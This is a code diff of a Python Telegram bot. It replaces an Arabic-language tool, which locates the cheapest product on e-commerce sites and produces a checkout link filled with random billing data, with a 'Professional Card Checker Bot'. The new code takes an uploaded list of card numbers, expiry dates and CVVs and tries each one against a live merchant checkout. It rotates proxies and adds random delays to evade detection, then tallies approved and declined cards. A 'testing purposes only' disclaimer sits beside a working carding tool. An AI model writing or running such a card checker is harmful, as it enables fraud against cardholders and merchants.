-        "✨ <b>ماذا أفعل؟</b>\n"
-        "• أبحث عن <b>أرخص منتج</b> في الموقع 🔍\n"
-        "• أضيفه للسلة تلقائياً 🛒\n"
-        "• أملأ بيانات الفواتير عشوائياً 📝\n"
-        "• أعطيك رابط الدفع الجاهز! 🔗\n\n"
-        "🌐 <b>المنصات المدعومة:</b>\n"
-        "✅ Shopify\n"
-        "✅ WooCommerce\n"
-        "✅ Magento\n"
-        "✅ BigCommerce\n"
-        "✅ PrestaShop\n"
-        "✅ وأي موقع تجارة إلكترونية آخر!\n\n"
-        "📝 <b>كيف تستخدمني؟</b>\n"
-        "فقط أرسل لي رابط الموقع:\n\n"
-        "<code>https://example.com</code>"
-    )
-    await update.message.reply_text(welcome, parse_mode='HTML')
+    """Start command"""
+    welcome_msg = """
+🤖 **Professional Card Checker Bot**
+
+**Commands:**
+/start - Show this message
+/check - Start card checking
+
+**How to use:**
+1. Send /check
+2. Send checkout URL
+3. Upload cards.txt file
+4. Upload proxies.txt file (optional)
+5. Wait for results
+
+**File formats:**
+cards.txt: `4242424242424242|12|2025|123|John Doe`
+proxies.txt: `http://user:pass@proxy.com:8080`
+
+⚠️ **For testing purposes only!**
+"""
+    await update.message.reply_text(welcome_msg)
 
 
-async def handle_url(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """معالج الروابط"""
-    url = update.message.text.strip()
+async def check_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Check command"""
+    context.user_data['state'] = 'waiting_url'
+    await update.message.reply_text("📝 Send me the checkout URL:")
+
+
+async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Handle messages"""
+    state = context.user_data.get('state')
     
-    if not url.startswith(('http://', 'https://')):
-        url = 'https://' + url
+    if state == 'waiting_url':
+        url = update.message.text
+        if not url.startswith('http'):
+            await update.message.reply_text("❌ Invalid URL. Please send a valid checkout URL.")
+            return
+        
+        context.user_data['url'] = url
+        context.user_data['state'] = 'waiting_cards'
+        await update.message.reply_text("✅ URL saved!\n\n📄 Now send cards.txt file:")
     
-    waiting_msg = await update.message.reply_text(
-        "⏳ <b>جاري التحليل...</b>\n\n"
-        "🔍 البحث عن أرخص منتج\n"
-        "⏱️ قد يستغرق 30-60 ثانية...",
-        parse_mode='HTML'
-    )
-    
-    bot = UniversalCheckoutBot()
-    result = bot.process_website(url)
-    
-    if result['success']:
-        product = result['product']
-        checkout_info = result['checkout_info']
-        filled_data = result.get('filled_data')
-        
-        response = (
-            "✅ <b>تم بنجاح!</b>\n\n"
-            f"📦 <b>المنتج:</b> {product['name'][:80]}\n"
-            f"💰 <b>السعر:</b> {product['price_text']}\n\n"
-            f"🔗 <b>رابط الدفع:</b>\n<code>{checkout_info['checkout_url']}</code>\n\n"
-        )
-        
-        if checkout_info.get('total_amount'):
-            response += f"💵 <b>المبلغ الإجمالي:</b> {checkout_info['total_amount']}\n"
-        
-        if checkout_info.get('payment_methods'):
-            response += f"💳 <b>طرق الدفع:</b> {', '.join(checkout_info['payment_methods'])}\n"
-        
-        if filled_data:
-            response += (
-                f"\n📝 <b>البيانات المُدخلة (عشوائية):</b>\n"
-                f"• الاسم: {filled_data['first_name']} {filled_data['last_name']}\n"
-                f"• البريد: {filled_data['email']}\n"
-                f"• الهاتف: {filled_data['phone']}\n"
-                f"• العنوان: {filled_data['address']}, {filled_data['city']}\n"
-            )
-        
-        response += "\n✨ <b>الرابط جاهز! افتحه وأكمل الدفع.</b>"
-        
-        await waiting_msg.edit_text(response, parse_mode='HTML')
     else:
-        error_msg = (
-            f"❌ <b>فشل التحليل</b>\n\n"
-            f"السبب: {result.get('error', 'خطأ غير معروف')}\n\n"
-            f"💡 جرب موقعاً آخر أو تأكد من الرابط."
-        )
-        await waiting_msg.edit_text(error_msg, parse_mode='HTML')
+        await update.message.reply_text("❌ Unknown command. Use /start to see available commands.")
+
+
+async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Handle file uploads"""
+    state = context.user_data.get('state')
+    
+    if state == 'waiting_cards':
+        # Download cards file
+        file = await update.message.document.get_file()
+        cards_path = f'/tmp/cards_{update.effective_user.id}.txt'
+        await file.download_to_drive(cards_path)
+        
+        context.user_data['cards_file'] = cards_path
+        context.user_data['state'] = 'waiting_proxies'
+        
+        await update.message.reply_text("✅ Cards file saved!\n\n🔄 Now send proxies.txt file (or send /skip to continue without proxies):")
+    
+    elif state == 'waiting_proxies':
+        # Download proxies file
+        file = await update.message.document.get_file()
+        proxies_path = f'/tmp/proxies_{update.effective_user.id}.txt'
+        await file.download_to_drive(proxies_path)
+        
+        context.user_data['proxies_file'] = proxies_path
+        
+        # Start checking
+        await start_checking(update, context)
+
+
+async def skip_proxies(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Skip proxies"""
+    if context.user_data.get('state') == 'waiting_proxies':
+        context.user_data['proxies_file'] = None
+        await start_checking(update, context)
+
+
+async def start_checking(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Start card checking process"""
+    url = context.user_data.get('url')
+    cards_file = context.user_data.get('cards_file')
+    proxies_file = context.user_data.get('proxies_file')
+    
+    # Read cards
+    with open(cards_file, 'r') as f:
+        cards = [line.strip() for line in f if line.strip()]
+    
+    # Read proxies
+    proxies = []
+    if proxies_file:
+        with open(proxies_file, 'r') as f:
+            proxies = [line.strip() for line in f if line.strip()]
+    
+    await update.message.reply_text(f"🚀 Starting check...\n\n📊 Cards: {len(cards)}\n🔄 Proxies: {len(proxies) if proxies else 0}\n\n⏳ Please wait...")
+    
+    # Check cards
+    results = []
+    url_expired = False
+    for i, card_line in enumerate(cards, 1):
+        try:
+            parts = card_line.split('|')
+            if len(parts) < 4:
+                continue
+            
+            card_number = parts[0].strip()
+            exp_month = parts[1].strip()
+            exp_year = parts[2].strip()
+            cvv = parts[3].strip()
+            name = parts[4].strip() if len(parts) > 4 else "John Doe"
+            
+            # Select proxy
+            proxy = None
+            if proxies:
+                proxy = proxies[(i-1) % len(proxies)]
+            
+            # Check card
+            checker = CardChecker(proxy=proxy)
+            result = checker.check_card(url, card_number, exp_month, exp_year, cvv, name)
+            
+            # Check if URL expired
+            if result['code'] == 'URL_EXPIRED':
+                url_expired = True
+                await update.message.reply_text(
+                    "⏰ **Checkout URL Expired!**\n\n"
+                    "🔴 The checkout link is no longer valid.\n"
+                    "This can happen when:\n"
+                    "  • Session timeout\n"
+                    "  • Cart cleared\n"
+                    "  • Link expired\n\n"
+                    "🔄 **Please provide a new checkout URL**\n\n"
+                    "Send /check to start with a new URL."
+                )
+                break
+            
+            # Format result
+            masked_card = f"{card_number[:4]}...{card_number[-4:]}"
+            result_msg = f"{i}/{len(cards)} - {result['status']}\n"
+            result_msg += f"💳 {masked_card} | {exp_month}/{exp_year} | {cvv}\n"
+            result_msg += f"🏦 Gateway: {result['gateway']}\n"
+            result_msg += f"📝 {result['message']}\n"
+            
+            if proxy:
+                result_msg += f"🔄 Proxy: {proxy.split('@')[1] if '@' in proxy else proxy}\n"
+            
+            results.append(result_msg)
+            
+            # Send progress
+            await update.message.reply_text(result_msg)
+            
+            # Random delay
+            time.sleep(random.uniform(3, 8))
+            
+        except Exception as e:
+            logger.error(f"Error checking card {i}: {e}")
+            continue
+    
+    # Send summary (only if not expired)
+    if not url_expired:
+        summary = f"\n\n✅ **Check Complete!**\n\n"
+        summary += f"📊 Total: {len(cards)}\n"
+        summary += f"✅ Approved: {sum(1 for r in results if 'Approved' in r)}\n"
+        summary += f"❌ Declined: {sum(1 for r in results if 'Declined' in r)}\n"
+        summary += f"🔐 Auth Required: {sum(1 for r in results if 'Auth Required' in r)}\n"
+        
+        await update.message.reply_text(summary)
+    
+    # Reset state
+    context.user_data.clear()
 
 
 def main():
-    """الدالة الرئيسية"""
-    TOKEN = os.environ.get('TELEGRAM_BOT_TOKEN')
+    """Start bot"""
+    app = Application.builder().token(BOT_TOKEN).build()
     
-    if not TOKEN:
-        logger.error("❌ TELEGRAM_BOT_TOKEN غير موجود!")
-        return
+    app.add_handler(CommandHandler("start", start))
+    app.add_handler(CommandHandler("check", check_command))
+    app.add_handler(CommandHandler("skip", skip_proxies))
+    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
+    app.add_handler(MessageHandler(filters.Document.ALL, handle_document))
     
-    application = Application.builder().token(TOKEN).build()
-    
-    application.add_handler(CommandHandler("start", start))
-    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_url))
-    
-    logger.info("✅ البوت يعمل...")
-    application.run_polling(allowed_updates=Update.ALL_TYPES)
+    logger.info("🤖 Bot started!")
+    app.run_polling()
 
 
 if __name__ == '__main__':
